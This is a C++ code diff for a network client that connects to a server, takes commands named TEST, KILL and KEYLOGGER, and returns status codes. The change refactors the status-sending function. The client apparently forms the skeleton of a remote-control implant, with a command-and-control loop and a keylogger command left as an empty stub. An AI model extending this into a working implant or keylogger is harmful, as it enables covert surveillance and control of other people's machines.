@@ -16,26 +16,6 @@ Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
     start();
 }
 
-void Client::send_out(Status __status) {
-    char buf[OUT_SIZE];
-    
-    memcpy(buf, OUT_KEY, OUT_KEY_LEN);
-    
-    // Little endian format
-    buf[OUT_KEY_LEN] = static_cast<char>(__status & 0XFF);
-    buf[OUT_KEY_LEN + 1] = static_cast<char>((__status >> 8) & 0XFF);
-    
-    int rc = send(socket_, buf, OUT_SIZE, 0);
-    if (rc < 0) {
-        printf("Error sending data: %s\n", strerror(errno));
-        retry_flag_ = true;
-    } else if (rc == 0) {
-        printf("Server closed connection\n");
-        retry_flag_ = true;
-    } else {
-        printf("Sent %d bytes to server\n", rc);
-    }
-}
 
 int Client::init() {
     memset(&server_addr_, 0, sizeof(server_addr_));
@@ -84,7 +64,7 @@ void Client::start() {
             goto retry;
         }
         printf("Connected to server %s:%d\n", ip_, port_);
-        while (!retry_flag_) {
+        while (!retry_flag_ && !shutdown_flag_) {
             bytes_received = recv(socket_, &command, sizeof(command), 0);
             if (bytes_received < 0) {
                 printf("Error receiving data\n");
@@ -99,20 +79,19 @@ void Client::start() {
             switch (command_code) {
                 case TEST:
                     printf("Received TEST command\n");
-                    send_out(EXEC_SUCCESS);
+                    retry_flag_ = send_out(socket_, EXEC_SUCCESS);
                     break;
                 case KILL:
                     printf("Received KILL command\n");
-                    send_out(EXEC_SUCCESS);
+                    retry_flag_ = send_out(socket_, EXEC_SUCCESS);
                     shutdown_flag_ = true;
-                    retry_flag_ = true;
                     break;
                 case KEYLOGGER:
                     printf("Received KEYLOGGER command\n");
                     break;
                 default:
                     printf("Unknown command: %d\n", command_code);
-                    send_out(EXEC_ERROR);
+                    retry_flag_ = send_out(socket_, EXEC_ERROR);
                     break;
             }
         }
